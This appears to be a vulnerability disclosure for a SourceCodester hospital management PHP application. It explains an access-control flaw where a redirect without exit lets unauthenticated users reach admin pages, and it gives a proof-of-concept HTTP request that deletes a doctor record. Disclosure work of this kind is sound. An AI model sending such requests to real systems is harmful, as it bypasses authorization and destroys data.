# SourceCodester Free Hospital Management System for Small Practices 1.0 has a vertical privilege escalation vulnerability
## Software
- Software: Free Hospital Management System for Small Practices 1.0
- Software Link: https://www.sourcecodester.com/php/16720/free-hospital-management-system-small-practices.html
- Vulnerability Type: Vertical Privilege Escalation
- Attack Type: Remote
- Vendor of Product: Sourcecodester
## Description
SourceCodester Free Hospital Management System for Small Practices 1.0 has a vertical privilege escalation vulnerability, allowing attackers to intercept redirects and gain unauthorized access to the administrative backend with system administrator privileges.The developer implemented a redirect in the permission check without using the `die()` or `exit()` functions to terminate the program execution, which resulted in vertical privilege escalation.
## Vulnerability Code
Here is an example of how an attacker can exploit the vertical privilege escalation vulnerability in the /vm/admin/delete-doctor.php file to delete information of any doctor. The vulnerable code is as follows:
![Vulnerability Code](https://github.com/Yesec/Free-Hospital-Management-System-for-Small-Practices/assets/19534204/021258a2-b971-4102-bf20-548520b7d576)

## POC
```http
GET /vm/admin/delete-doctor.php?id=2 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close


```
